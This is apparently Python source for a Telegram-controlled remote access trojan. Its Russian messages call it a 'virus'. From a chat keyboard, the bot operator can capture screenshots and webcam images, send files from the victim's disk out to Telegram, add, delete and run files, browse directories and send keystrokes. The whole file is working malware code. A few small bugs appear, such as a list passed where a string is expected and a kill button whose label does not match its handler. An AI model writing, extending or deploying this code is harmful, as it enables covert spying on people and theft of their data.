import telebot
from telebot import types
import time
import pyautogui
import cv2
import pyautogui as pg
import os


def add_file(message):
    try:
        file_data = message.text
        file_content = file_data.split(" ", 1)
        file_path = os.path.join(current_directory, file_content)
        with open(file_path, 'w') as file:
                file.write(file_content)
        bot.send_message(message.chat.id, f"Файл {file_content} был добавлен в диск")
    except:
        bot.send_message(message.chat.id, "Ошибка при добавлении файла")
    

def delete_file(message):
    file_data = message.text
    file_path = os.path.join(current_directory, file_data)
    if os.path.exists(file_path):
        os.remove(file_path)
        bot.send_message(message.chat.id, f"Файл {file_data} был удален с диска")
    else:
        bot.send_message(message.chat.id, f"Файл {file_data} не найден на диске")

def obtain_file(message):
    file_data = message.text
    file_path = os.path.join(current_directory, file_data)
    if os.path.exists(file_path):
        with open(file_path, 'rb') as file:
            bot.send_document(message.chat.id, file, caption=f"Файл: {file_data}")
    else:
        bot.send_message(message.chat.id, f"Файл {file_data} не найден на диске")

def start_file(message):
    file_data = message.text
    file_path = os.path.join(current_directory, file_data)
    if os.path.exists(file_path):
        os.system(file_path)
        bot.send_message(message.chat.id, f"Файл {file_data} был запущен")
    else:
        bot.send_message(message.chat.id, f"Файл {file_data} не найден на диске")

def change_dir(message):
    global current_directory
    new_dir = message.text
    if os.path.isdir(new_dir):
        current_directory = new_dir
        bot.send_message(message.chat.id, f"Вы перешли в директорию: {current_directory}")
    else:
        bot.send_message(message.chat.id, f"Директория {new_dir} не существует.")



    

pyautogui.FAILSAFE= False 
t = time.strftime("%X")
beta = 2
current_directory = os.getcwd()

bot = telebot.TeleBot("token")
@bot.message_handler(commands=['start'])
def send_welcome(message):
    
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Проверить подключение")
    btn2 = types.KeyboardButton("Вебка")
    btn3 = types.KeyboardButton("Скрин")
    btn4 = types.KeyboardButton("Файлы")
    btn5 = types.KeyboardButton("Убить")
    markup.add(btn1)
    markup.add(btn2, btn3)
    markup.add(btn4)
    markup.add(btn5)
    bot.send_message(message.chat.id, f"Файл с: Активен \nСервер был подключён в: {t} \nВремя у сервера: " + time.strftime("%X"), reply_markup=markup)

   
@bot.message_handler(func=lambda message: True)
def echo_all(message):
    global beta
    global current_directory
   
    markup = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn1 = types.KeyboardButton("Проверить подключение")
    btn2 = types.KeyboardButton("Вебка")
    btn3 = types.KeyboardButton("Скрин")
    btn4 = types.KeyboardButton("Файлы")
    btn5 = types.KeyboardButton("Далее")
    markup.add(btn1)
    markup.add(btn2, btn3)
    markup.add(btn4)
    markup.add(btn5)

    markup2 = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn22 = types.KeyboardButton("Закрыть вкладку")
    btn33 = types.KeyboardButton("Enter")
    btn44 = types.KeyboardButton("Минус курсор")
    btn55 = types.KeyboardButton("Убить")
    btn66 = types.KeyboardButton("Назад")
    markup2.add(btn22, btn33)
    markup2.add(btn44, btn55)
    markup2.add(btn66)

    soglas = types.ReplyKeyboardMarkup(resize_keyboard=True)
    sog1 = types.KeyboardButton("Да")
    sog2 = types.KeyboardButton("Нет")
    soglas.add(sog1,sog2)


    markup3 = types.ReplyKeyboardMarkup(resize_keyboard=True)
    btn_add=types.KeyboardButton("Добавить файл")
    btn_delete=types.KeyboardButton("Удалить файл")
    btn_obtain = types.KeyboardButton("Получить файл")
    btn_start = types.KeyboardButton("Запустить файл")
    btn_show=types.KeyboardButton("Список файлов")
    btn_open_dir=types.KeyboardButton("Перейти в папку")
    markup3.add(btn_add, btn_delete)
    markup3.add(btn_obtain, btn_start)
    markup3.add(btn_show, btn_open_dir)
    markup3.add(btn66)
 
    if message.text == "Проверить подключение":
        bot.send_message(message.chat.id, f"Файл с вирусом: Активен \nСервер был подключён в: {t} \nВремя у сервера: " + time.strftime("%X"), reply_markup=markup)
    if message.text == "Убить вирус": 
        bot.send_message(message.chat.id, "Вы точно хотите убить вирус ?", reply_markup=soglas)
        beta = 1
    if message.text == "Да" and beta == 1:
        bot.send_message(message.chat.id, "Вирус был выключен", reply_markup=markup)
        bot.stop_polling()
    if message.text == "Нет" and beta == 1:
        beta = 2 
        bot.send_message(message.chat.id, "Отлично!", reply_markup=markup2)
    if message.text == "Скрин":
        screen = pyautogui.screenshot()
        bot.send_photo(message.chat.id, screen)
    
     
    if message.text == "Вебка":
        bot.send_message(message.chat.id, "Подождите", reply_markup=markup)
        cap = cv2.VideoCapture(0)

        if not cap.isOpened():
            bot.send_message(message.chat.id, "Не удалось открыть камеру", reply_markup=markup)


        # "Прогреваем" камеру, чтобы снимок не был тёмным
        for i in range(30):
            cap.read()
            
        ret, frame = cap.read()
        
        cv2.imwrite('cam.png', frame)
        photo = open('cam.png', 'rb')
        bot.send_photo(message.chat.id, photo)
        photo.close()
        
        cap.release()
        os.remove("cam.png")
 

    if message.text == "Далее":
        bot.send_message(message.chat.id, "Вторая панель", reply_markup=markup2)
    if message.text == "Назад":
        bot.send_message(message.chat.id, "Первая панель", reply_markup=markup)
    if message.text == "Закрыть вкладку":
        bot.send_message(message.chat.id, "Вкладка успешно была закрыта", reply_markup=markup2)
        pg.hotkey("alt", "F4")
    if message.text == "Enter" :
        bot.send_message(message.chat.id, "Enter успешно был нажат", reply_markup=markup2)
        pg.press("Enter")
    if message.text == "Минус курсор":
        bot.send_message(message.chat.id, "Курсор сломан на 0.2сек", reply_markup=markup2)
        pyautogui.moveTo(0, 0)
    

    if message.text == "Файлы":
        bot.send_message(message.chat.id, f"Третья панель\n{current_directory}", reply_markup=markup3)
    if message.text=="Добавить файл":
        bot.send_message(message.chat.id, "Введите название файла и содержимое в формате: <имя> <содержимое>")
        bot.register_next_step_handler(message, lambda m: add_file(m))
    if message.text == "Удалить файл":
        bot.send_message(message.chat.id, "Введите название файла для удаления:")
        bot.register_next_step_handler(message, lambda m: delete_file(m))
    if message.text == "Получить файл":
        bot.send_message(message.chat.id, "Ввведите название файла для получения:")
        bot.register_next_step_handler(message, lambda m: obtain_file(m))
    if message.text =="Запустить файл":
        bot.send_message(message.chat.id, "Введите название файла для запуска:")
        bot.register_next_step_handler(message, lambda m: start_file(m))
    if message.text == "Список файлов":
        items = os.listdir(current_directory)
        result = ""
        if items:
            for item in items:
                full_path = os.path.join(current_directory, item)
                if os.path.isdir(full_path):
                    result += f"[Dir] {item}\n"
                else:
                    result += f"[File] {item}\n"
            bot.send_message(message.chat.id, current_directory+"\n"+result)
        else:
            bot.send_message(message.chat.id, "Нет файлов в f{current_directory} директории")
        
    if message.text =="Перейти в папку":
        bot.send_message(message.chat.id,"Введите путь в папку:" )
        bot.register_next_step_handler(message, lambda m: change_dir(m))
    
bot.infinity_polling()
